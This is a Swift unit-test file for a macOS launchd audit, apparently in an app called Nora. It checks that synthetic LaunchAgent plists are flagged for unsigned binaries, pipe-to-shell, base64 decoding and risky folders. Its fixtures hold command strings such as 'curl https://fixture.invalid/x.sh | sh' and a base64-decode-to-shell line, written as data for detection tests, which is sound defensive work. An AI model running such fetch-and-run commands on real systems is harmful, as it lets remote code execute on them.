import XCTest
@testable import Nora

/// The launchd audit against synthetic plists in a temp folder. Nothing here touches the real LaunchAgents.
final class SecurityAuditTests: XCTestCase {
    private var root: URL!

    override func setUpWithError() throws {
        root = FileManager.default.temporaryDirectory.appendingPathComponent("nora-audit-\(UUID().uuidString)", isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        try? FileManager.default.removeItem(at: root)
    }

    private func writePlist(_ name: String, _ dictionary: [String: Any]) throws {
        let data = try PropertyListSerialization.data(fromPropertyList: dictionary, format: .xml, options: 0)
        try data.write(to: root.appendingPathComponent(name))
    }

    /// A plain text script with no signature: Security.framework reports it as unsigned.
    private func unsignedScript(_ name: String) throws -> String {
        let url = root.appendingPathComponent(name)
        try "#!/bin/sh\necho fixture\n".write(to: url, atomically: true, encoding: .utf8)
        return url.path
    }

    private func audit() -> LaunchAudit.Report {
        LaunchAudit.scanSync([LaunchAudit.Directory(url: root, scope: .userAgent)])
    }

    private func item(_ label: String, in report: LaunchAudit.Report) throws -> LaunchItem {
        try XCTUnwrap(report.items.first { $0.label == label }, "no item \(label)")
    }

    func testUnsignedProgramWithPipeToShellIsFlagged() throws {
        let script = try unsignedScript("pipe-agent.sh")
        try writePlist("pipe.plist", ["Label": "com.example.fixture.pipe",
                                      "ProgramArguments": [script, "-c", "curl https://fixture.invalid/x.sh | sh"]])
        let found = LaunchAudit.reasons(for: try item("com.example.fixture.pipe", in: audit()))
        XCTAssertTrue(found.contains(.unsigned))
        XCTAssertTrue(found.contains(.pipesIntoShell))
    }

    func testBase64DecodingInArgumentsIsFlagged() throws {
        let script = try unsignedScript("decode-agent.sh")
        try writePlist("decode.plist", ["Label": "com.example.fixture.decode",
                                        "ProgramArguments": [script, "-c", "echo aGk= | base64 -d | sh"]])
        XCTAssertTrue(LaunchAudit.reasons(for: try item("com.example.fixture.decode", in: audit())).contains(.decodesBase64))
    }

    func testMissingBinaryInTemporaryFolderIsFlagged() throws {
        try writePlist("tmp.plist", ["Label": "com.example.fixture.tmp",
                                     "Program": "/tmp/nora-fixture-missing-agent"])
        let found = LaunchAudit.reasons(for: try item("com.example.fixture.tmp", in: audit()))
        XCTAssertTrue(found.contains(.missingBinary))
        XCTAssertTrue(found.contains(.inTemporaryFolder))
    }

    func testSharedFolderAndOsascriptAreFlagged() throws {
        try writePlist("shared.plist", ["Label": "com.example.fixture.shared",
                                        "ProgramArguments": ["/Users/Shared/fixture-agent", "-e", "osascript -e 'fixture'"]])
        let found = LaunchAudit.reasons(for: try item("com.example.fixture.shared", in: audit()))
        XCTAssertTrue(found.contains(.inSharedFolder))
        XCTAssertTrue(found.contains(.runsOsascript))
    }

    func testHiddenFolderIsFlagged() throws {
        let hidden = root.appendingPathComponent(".hidden", isDirectory: true)
        try FileManager.default.createDirectory(at: hidden, withIntermediateDirectories: true)
        let script = hidden.appendingPathComponent("agent.sh")
        try "#!/bin/sh\n".write(to: script, atomically: true, encoding: .utf8)
        try writePlist("hidden.plist", ["Label": "com.example.fixture.hidden", "Program": script.path])
        XCTAssertTrue(LaunchAudit.reasons(for: try item("com.example.fixture.hidden", in: audit())).contains(.inHiddenFolder))
    }

    func testAppleSignedItemsAreNeverFlagged() throws {
        try writePlist("apple.plist", ["Label": "com.example.fixture.apple",
                                       "ProgramArguments": ["/bin/ls", "curl https://fixture.invalid | sh", "osascript", "base64 -d"]])
        let launched = try item("com.example.fixture.apple", in: audit())
        XCTAssertEqual(launched.signature, .apple)
        XCTAssertTrue(LaunchAudit.reasons(for: launched).isEmpty)
    }

    func testSystemPathsAreNeverFlagged() throws {
        try writePlist("system.plist", ["Label": "com.example.fixture.system",
                                        "Program": "/System/Library/Fixture/agent"])
        XCTAssertTrue(LaunchAudit.reasons(for: try item("com.example.fixture.system", in: audit())).isEmpty)
    }

    func testPlistFieldsAndLabelFallback() throws {
        try writePlist("fallback.plist", ["Program": "/bin/ls", "RunAtLoad": true, "KeepAlive": ["SuccessfulExit": false]])
        let launched = try item("fallback", in: audit())
        XCTAssertTrue(launched.runAtLoad)
        XCTAssertTrue(launched.keepAlive)
        XCTAssertTrue(launched.binaryExists)
    }

    func testUnparsablePlistIsReportedAsUnreadable() throws {
        try Data("not a property list".utf8).write(to: root.appendingPathComponent("broken.plist"))
        let report = audit()
        XCTAssertTrue(report.items.isEmpty)
        XCTAssertEqual(report.unreadable, ["broken.plist"])
    }
}
